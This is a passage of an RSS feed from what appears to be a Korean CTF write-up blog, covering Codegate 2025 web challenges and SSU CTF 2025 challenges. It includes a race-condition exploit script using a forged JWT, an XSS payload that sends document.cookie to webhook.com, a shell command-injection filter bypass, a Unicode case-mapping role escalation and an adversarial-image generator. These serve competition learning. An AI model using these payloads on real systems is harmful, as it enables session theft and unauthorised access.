app.post(&quot;/auth&quot;, async (req, res) =&amp;gt; {
    try {
        const token = req.cookies.check ?? &quot;&quot;;
        const data = await read_JWT(token, PublicKey);
        if (db.admin.uid !== data.uid) {
            res.json({ message: &quot;Permission denied&quot; });
            return;
        }
        const { data: input } = req.body;
        const storedData = await fs.promises.readFile(temporaryFileName, &quot;utf-8&quot;);
        if (input === storedData) {
            res.json({ flag });
        } else {
            res.json({ message: &quot;Token Error&quot; });
        }
    } catch (a) {
        res.json({ message: &quot;Internal Error&quot; });
    }
});

app.post(&quot;/data&quot;, (req, res) =&amp;gt; {
    res.status(req.body.auth_key ? 200 : 400).send(req.body.auth_key ? &apos;Success&apos; : &apos;Failed&apos;);
});

app.listen(1234);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;먼저 어드민 계정을 얻어야하는데&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;let payload = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId }))));
return `${headerData}.${payload}.${urlsafe(b64Lib.encode(new Uint8Array(sig)))}`;

...

const read_JWT = async (token) =&amp;gt; {
    const decoder = new TextDecoder();
    let payload = token.split(&quot;.&quot;)[1];
    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll(&apos;\x00&apos;, &apos;&apos;));
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;read_JWT()&lt;/code&gt; 함수는 인자로 token 하나만을 받지만 위 코드에서는 두번째 인자에 PublicKey를 보낸다.
즉, 애초에 PublicKey 검증 자체를 안한다는 것이다 (검증한다고 하더라도 PublicKey는 코드에 공개되어있다)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{ uid: &quot;admin&quot; }&lt;/code&gt; 넣고 base64 인코딩해서 어드민 토큰을 생성할 수 있다.&lt;/p&gt;
&lt;p&gt;나머지 코드를 분석해보자.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/auth&lt;/code&gt;에서는 해시 값과 내 입력이 동일하다면 플래그를 준다.
하지만 저 해시값을 예측하는 건 불가능하다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const storedData = await fs.promises.readFile(temporaryFileName, &quot;utf-8&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;위 코드를 봤을 때 &lt;code&gt;await fs.promises&lt;/code&gt;를 사용해파일을 비동기적으로 읽는다는 걸 알 수 있고 Race Condition이 가능해진다는걸 알 수 있다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import threading
import requests

def send_2fa():
    requests.post(&quot;http://15.165.38.117:1234/2fa&quot;, cookies={&quot;check&quot;: &quot;test.eyJ1aWQiOiI4N2M4NjllNzI5NTY2M2YyYzAyNTFmYzMxMTUwZDBlMyJ9&quot;})

def read_auth():
    response = requests.post(&quot;http://15.165.38.117:1234/auth&quot;, cookies={&quot;check&quot;: &quot;test.eyJ1aWQiOiI4N2M4NjllNzI5NTY2M2YyYzAyNTFmYzMxMTUwZDBlMyJ9&quot;}, json={&quot;data&quot;: &quot;&quot;})
    print(response.text)

threading.Thread(target=send_2fa).start()
threading.Thread(target=read_auth).start()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;익스코드는 위와 같다
2fa를 보낸 후 파일에 해시값이 새로 쓰이기 전까지 잠깐의 텀이 생긴다
그 사이에 auth로 빈 값 (&quot;&quot;)과 비교해 주면 플래그를 얻을 수 있다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;codegate2025{8b2c743e13f766b30c9c1e72e8a6595a651321da1c01eda7776fbd8e209ef9feace5a162237e696ea4b58a7bdf0b88dfb7f25c5ac76f4e12a4c4538d438fcdbf}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Masquerade&lt;/h3&gt;
&lt;p&gt;업솔빙 때린 문제인데 인상깊어서 풀진 못했지만 적어본다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./mar1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;비밀번호를 입력하면 uuid 하나를 만들어주는데 로그인 해보면 MEMBER 역할이 기본적으로 할당 되어있다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const puppeteer = require(&apos;puppeteer&apos;);
const { generateToken } = require(&apos;./jwt&apos;)

const delay = (ms) =&amp;gt; new Promise(resolve =&amp;gt; setTimeout(resolve, ms));

const viewUrl = async (post_id) =&amp;gt; {
    const token = generateToken({ uuid: &quot;codegate2025{test_flag}&quot;, role: &quot;ADMIN&quot;, hasPerm: true })

    const cookies = [{ &quot;name&quot;: &quot;jwt&quot;, &quot;value&quot;: token, &quot;domain&quot;: &quot;localhost&quot; }];

    const browser = await puppeteer.launch({
        executablePath: &apos;/usr/bin/chromium&apos;,
        args: [&quot;--no-sandbox&quot;]
    });

    let result = true;

    try {
        await browser.setCookie(...cookies);

        const page = await browser.newPage();

        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: &quot;domcontentloaded&quot; });

        await delay(1000);

        const button = await page.$(&apos;#delete&apos;);
        await button.click();

        await delay(1000);
    } catch (error) {
        console.error(&quot;An Error occurred:&quot;, error);
        result = false;
    } finally {
        await browser.close();
    }

    return result;
};

module.exports = { viewUrl };
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;app.use((req, res, next) =&amp;gt; {
  const nonce = crypto.randomBytes(16).toString(&apos;hex&apos;);

  res.setHeader(&quot;X-Frame-Options&quot;, &quot;deny&quot;);

  if (req.path.startsWith(&apos;/admin&apos;)) {
    res.setHeader(&quot;Content-Security-Policy&quot;, `default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;`);
  } else {
    res.setHeader(&quot;Content-Security-Policy&quot;, `default-src &apos;self&apos;; script-src &apos;nonce-${nonce}&apos;`);
  }

  res.locals.nonce = nonce;

  next();
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;코드에 봇이 있는걸로 봐서는 제공된 게시판에서 XSS를 일으켜야한다는걸 알 수 있지만 기본적으로 csp가 빡세게 걸려있다.
따라서 /admin 경로에서 xss를 유도해야한다는걸 알 수 있다.&lt;/p&gt;
&lt;p&gt;차근차근 분석해보자&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const role_list = [&quot;ADMIN&quot;, &quot;MEMBER&quot;, &quot;INSPECTOR&quot;, &quot;DEV&quot;, &quot;BANNED&quot;];

function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

const addUser = (password) =&amp;gt; {
    const uuid = uuidv4()

    users.set(uuid, { password, role: &quot;MEMBER&quot;, hasPerm: false });

    return uuid;
};

const getUser = (uuid) =&amp;gt; {
    return users.get(uuid);
};

const getUsers = () =&amp;gt; {
    console.log(users);
    return 1;
};

const setRole = (uuid, input) =&amp;gt; {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });

    const updated = getUser(uuid);

    const payload = { uuid, ...updated }

    delete payload.password;

    const token = generateToken(payload);

    return token;
};

const setPerm = (uuid, input) =&amp;gt; {
    const user = getUser(uuid);
    console.log(uuid, { ...user, hasPerm: input })

    console.log(user);

    users.set(uuid, { ...user, hasPerm: input });

    return true;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ADMIN, MEMBER, INSPECTOR, DEV, BANNED 역할이 존재한다
게시판 기능은 ADMIN만, 봇에게 report는 INSPECTOR만 할 수 있다.&lt;/p&gt;
&lt;p&gt;입력한 역할이 ADMIN이나 INSPECTOR면 false를 리턴한다.
하지만 &lt;code&gt;toUpperCase()&lt;/code&gt; 함수를 사용해 비교하고 있으므로 &lt;a href=&quot;https://lovflag.tistory.com/58&quot;&gt;Case Mapping Collision&lt;/a&gt;이 발생한다.&lt;/p&gt;
&lt;p&gt;ı(U+0131)을 활용해 입력하면 필터링을 우회하고 두 역할을 얻을 수 있다.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./mar2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;어드민 권한 탈취 후 패널에서 쓰기 권한을 켜주면 게시판에 글을 쓸 수 있게된다.&lt;/p&gt;
&lt;p&gt;(권한 바꾼 후 재로그인해야 권한이 정상적으로 적용된다. 이거 때문에 삽질 좀 했다)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const button = await page.$(&apos;#delete&apos;);
await button.click();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;봇이 &lt;code&gt;#delete&lt;/code&gt;를 클릭하는걸 활용해 XSS 할 수 있는데 클라이언트 단에서 dompurify가 막고 있다.&lt;/p&gt;
&lt;p&gt;bypass하기 위해 방법을 찾던 중 로드해오는 js 중에 난독화 된 바이너리를 발견했고 복호화한 결과 아래와 같은 코드가 나왔다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (!title &amp;amp;&amp;amp; !content) {
    post_content.innerHTML = &quot;Usage: ?title=a&amp;amp;content=b&quot;;
} else {
    try {
        post_title.innerHTML = DOMPurify.sanitize(title);
        post_content.innerHTML = DOMPurify.sanitize(content);
    } catch {
        post_title.innerHTML = title;
        post_content.innerHTML = content;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;오류가 나면 그냥 title이랑 content를 그대로 innerHTML 해서 문제없이 xss가 가능해진다.&lt;/p&gt;
&lt;p&gt;dompurify를 상대경로로 불러오고 있기에, &lt;code&gt;/admin/test/?title=a&amp;amp;content=(XSS_PAYLOAD)&lt;/code&gt;로 Open Redirect해서 RPO 터트려주면 된다.&lt;/p&gt;
&lt;p&gt;정리하자면 Case mapping collision + RPO + XSS였다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;area id=&quot;conf&quot;&amp;gt; &amp;lt;area id=&quot;conf&quot; name=&quot;deleteUrl&quot; href=&quot;/admin/test/?title=test&amp;amp;content=&amp;lt;img src=x onerror=&apos;location.href=`webhook.com?q=${document.cookie}`&apos;&amp;gt;&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;출제자 payload - 문제시 삭제하겠습니다&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;주니어부 0솔까지 갈 정도로 어려웠던 문제는 아니었던거 같은데 0솔인건 좀 의문이다&lt;/p&gt;
&lt;p&gt;확실히 CSP랑 dompurify에 대한 지식이 거의 없었어서 문제의도 파악이 어려웠던거 같다. 공부해야겠다&lt;/p&gt;
</content:encoded></item><item><title>SSU CTF 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/ssuctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ssuctf/</guid><description>Overall 28th, General 17th</description><pubDate>Sun, 26 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
&lt;p&gt;어려웠다.. 웹에서 처음보는 기법들이 많이 나와서 손도 못댔다&lt;br /&gt;
비교적 쉽게 나온 다른 분야 몇문제만 풀었다. 팀원들이 잘해줘서 생각보다 잘 나온거 같다.
100점짜리 문제는 올솔브했다&lt;/p&gt;
&lt;h2&gt;Solve&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Mazer (rev)&lt;/li&gt;
&lt;li&gt;meme (misc)&lt;/li&gt;
&lt;li&gt;compressor (misc)&lt;/li&gt;
&lt;li&gt;ssu shell (pwn)&lt;/li&gt;
&lt;li&gt;check the target (misc)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Write-Up&lt;/h2&gt;
&lt;h3&gt;Mazer&lt;/h3&gt;
&lt;p&gt;딱봐도 불가능해보이는 미로게임을 풀어야한다.
exe 파일이랑 이미지 에셋만 달랑 주길래 치트엔진으로 exe 조작해서 푸는거인가 싶었다.&lt;/p&gt;
&lt;p&gt;근데 자세히 보니 exe에 파이썬 로고가 있었고 따라서 파이썬으로 작성된 게임이란 걸 알 수 있었다.
pyinstxtractor를 사용해 pyc파일로 추출해주고 이를 다시 한 번 디컴파일해서 원문 python 코드를 얻을 수 있었다.&lt;/p&gt;
&lt;p&gt;여기서 깃허브 툴 몇 개 써서 해보면 중간에 오류뜨는데 온라인 툴 중에 깔끔히 디컴 되는게 있었다. 디컴 안 되서 어셈블리 리버싱해서 푼 분도 있다고 하신다 ㄷㄷ...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import pygame
import sys
import random
import hashlib

def xor_image_hash(frog_path, wall_path, floor_path, statue_path):
    hasher = hashlib.sha256()
    with open(frog_path, &apos;rb&apos;) as f:
        hasher.update(f.read())
    with open(wall_path, &apos;rb&apos;) as f:
        hasher.update(f.read())
    with open(floor_path, &apos;rb&apos;) as f:
        hasher.update(f.read())
    with open(statue_path, &apos;rb&apos;) as f:
        hasher.update(f.read())
    return hasher.hexdigest()[:16]

def make_flag():
    frog_file = &apos;chill.jpeg&apos;
    wall_file = &apos;wall.jpg&apos;
    floor_file = &apos;tile.jpg&apos;
    statue_file = &apos;flag.png&apos;
    result = xor_image_hash(frog_file, wall_file, floor_file, statue_file)
    flag = &apos;ssu{&apos; % result + &apos;}&apos;
    return flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;make_flag()&lt;/code&gt;는 이미지의 해시값을 받아서 플래그로 리턴해준다&lt;/p&gt;
&lt;p&gt;저부분만 때서 그대로 실행해주면 플래그를 얻을 수 있다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssu{236501dfe16b611f}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;meme&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;contract Ssumeme {
    address public owner;
    string private flag;

    constructor() {
        owner = msg.sender;

        uint256 blockHashPart = uint256(blockhash(block.number - 1)) % 1000000000;
        flag = string(abi.encodePacked(&quot;ssu{&quot;, uint2str(blockHashPart), &quot;_m3m3}&quot;));
    }

    function getFlag() public view returns (string memory) {
        require(msg.sender == owner, &quot;Only the contract owner can access the flag. Contact to soongsil.asc@gmail.com :)&quot;);
        return flag;
    }

    function uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) {
            return &quot;0&quot;;
        }
        uint256 j = _i;
        uint256 length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint256 k = length;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Solidity라는 프로그래밍 언어인거 같은데 누가봐도 저 flag가 수상해보인다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;block_hash = 0x3fd4e38b9b28cfe753436b3277eec250ffe435894957cc15ac493d864d1e0c29
block_hash %= 1000000000
print(block_hash)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;블록해시값 찾아서 넣은 다음에 계산 때려주면 된다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssu{809209385_m3m3}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;compressor&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import gzip
import hashlib
import os

def main():
    with open(__file__, &apos;r&apos;) as f:
        print(f.read())

    print(&apos;\n&apos;+&apos;=&apos;*50+&apos;\n&apos;)

    data = input(&apos;Your gzip (hex) &amp;gt;&amp;gt;&amp;gt; &apos;)

    try:
        data = bytes.fromhex(data)
        d_data = gzip.decompress(data)
    except (ValueError, gzip.BadGzipFile):
        print(&apos;Nah...&apos;)
        exit()


    origin_hash = hashlib.sha256(data).hexdigest()
    print(f&apos;{origin_hash=}&apos;)
    decomp_hash = hashlib.sha256(d_data).hexdigest()
    print(f&apos;{decomp_hash=}&apos;)

    if origin_hash == decomp_hash:
        print(os.environ.get(&apos;FLAG&apos;, &apos;dummy_flag&apos;))

if __name__ == &apos;__main__&apos;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;원래 data와 gzip으로 decompress한 데이터의 해시가 같으면 flag를 준다&lt;/p&gt;
&lt;p&gt;아무것도 입력 안하면 두 해시가 같기에 그냥 엔터치면 나온다&lt;/p&gt;
&lt;p&gt;원래 &lt;a href=&quot;https://github.com/Honno/gzip-quine/blob/main/quine.gz&quot;&gt;gzip-quine&lt;/a&gt;을 써서 푸는 문제였다고 한다. 문제에 검증이 빠져있어서 real compressor라는 리벤지 문제가 중간에 출제되었다 (이건 못풀었다)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssu{have_you_heard_about_the_quine?}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;ssu shell&lt;/h3&gt;
&lt;p&gt;받은 인풋을 그대로 echo 해주는 프로그램이다.&lt;/p&gt;
&lt;p&gt;몇몇 문자열이 필터링 되기에 명령어를 치환해서 넣어야한다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&apos;`cat ?lag_*`&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;이렇게 써주면 플래그를 읽을 수 있다&lt;/p&gt;
&lt;h3&gt;Check the target&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;import pickle
import numpy as np
import torch
import torch.nn as nn
import base64
import io
from PIL import Image
import os

class CustomModel(nn.Module):
    def __init__(self):
        super(CustomModel, self).__init__()
        self.hidden1 = nn.Linear(784, 256)
        self.hidden2 = nn.Linear(256, 128)
        self.output = nn.Linear(128, 10)
        with torch.no_grad():
            self.hidden1.weight[0] = torch.ones(784)*0.1
            self.hidden1.bias[0] = 0.1
            self.hidden2.weight[0] = torch.ones(256)*0.2
            self.hidden2.bias[0] = 0.2

    def forward(self, x: torch.Tensor) -&amp;gt; torch.Tensor:
        x = torch.relu(self.hidden1(x))
        x = torch.relu(self.hidden2(x))
        return torch.softmax(self.output(x), dim=1)

def modelLoad(path):
    model = CustomModel()
    weights = torch.load(path)
    model.load_state_dict(weights)
    model = model.eval()
    return model

def preprocess(x:str) -&amp;gt; torch.Tensor:
    image_data = base64.b64decode(x)
    image = Image.open(io.BytesIO(image_data))
    tensor = torch.tensor(np.array(image)).float().view(1, -1)
    return tensor

def predict(model, x):
    with torch.no_grad():
        out = model(x)
        prediction = out.argmax().item()
        confidence = out.max().item()

    return out,prediction, confidence

if __name__ == &quot;__main__&quot;:
    model = modelLoad(&quot;weights.pkl&quot;)
    x = input(&quot;[*] Enter the image data(base64): &quot;)
    x = preprocess(x)
    criterion = nn.CrossEntropyLoss()
    out,prediction, confidence = predict(model, x)
    loss = criterion(out, torch.tensor([7]))
    max_length = max(
            len(f&quot;Prediction : {prediction}&quot;),
            len(f&quot;Confidence : {confidence}&quot;),
            len(f&quot;Loss       : {loss.item()}&quot;),
        )
    print(&quot;╔&quot; + &quot;═&quot; * (max_length + 4) + &quot;╗&quot;)
    print(f&quot;║  Prediction : {prediction:&amp;lt;{max_length - 13}}  ║&quot;)
    print(f&quot;║  Confidence : {confidence:&amp;lt;{max_length - 13}}  ║&quot;)
    print(f&quot;║  Loss       : {loss.item():&amp;lt;{max_length - 13}}  ║&quot;)
    print(&quot;╚&quot; + &quot;═&quot; * (max_length + 4) + &quot;╝&quot;)

    success = prediction == 7 and confidence &amp;gt; 0.98
    if success:
        print(&quot;[*] Success!&quot;, os.environ.get(&quot;FLAG&quot;, &apos;dummy_flag&apos;))
    else:
        print(&quot;[*] Failed!&quot;)
        exit(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;이건 뭔가 이상한 언인텐이 있었는데 어떻게 푸는건지 모르겠다&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import torch
import numpy as np
from PIL import Image
import base64
import io

# 모델 초기화
class CustomModel(torch.nn.Module):
    def __init__(self):
        super(CustomModel, self).__init__()
        self.hidden1 = torch.nn.Linear(784, 256)
        self.hidden2 = torch.nn.Linear(256, 128)
        self.output = torch.nn.Linear(128, 10)

    def forward(self, x: torch.Tensor) -&amp;gt; torch.Tensor:
        x = torch.relu(self.hidden1(x))
        x = torch.relu(self.hidden2(x))
        return torch.softmax(self.output(x), dim=1)

# 가중치 로드
weights_path = &quot;weights.pkl&quot;
weights = torch.load(weights_path, map_location=torch.device(&apos;cpu&apos;))

# 모델 설정
model = CustomModel()
model.load_state_dict(weights)
model.eval()

# 조건을 만족하는 입력 데이터 생성
def generate_input(model, target_class=7, confidence_threshold=0.98):
    input_tensor = torch.rand(1, 784)  # 임의의 초기 입력값
    input_tensor.requires_grad = True

    optimizer = torch.optim.Adam([input_tensor], lr=0.1)

    for _ in range(1000):  # 최대 1000번 반복
        optimizer.zero_grad()
        output = model(input_tensor)
        confidence = output[0, target_class]
        loss = -confidence  # 타겟 클래스의 확률을 최대화
        loss.backward()
        optimizer.step()

        with torch.no_grad():
            input_tensor.clamp_(0, 1)  # 이미지 데이터는 [0, 1] 범위로 제한

        if confidence.item() &amp;gt; confidence_threshold:
            print(f&quot;조건 만족: 클래스 {target_class}, 신뢰도 {confidence.item()}&quot;)
            break

    return input_tensor

# 입력 데이터 생성
input_data = generate_input(model)

# 이미지로 변환
image_array = (input_data.view(28, 28).detach().numpy() * 255).astype(np.uint8)
image = Image.fromarray(image_array)
image.save(&quot;generated_image.png&quot;)

# 베이스64 인코딩
buffer = io.BytesIO()
image.save(buffer, format=&quot;PNG&quot;)
base64_image = base64.b64encode(buffer.getvalue()).decode()

print(f&quot;Base64 Encoded Image:\n{base64_image}&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ssu{g04t_of_m0de1_4na1ys1s}&lt;/code&gt;&lt;/p&gt;
</content:encoded></item></channel></rss>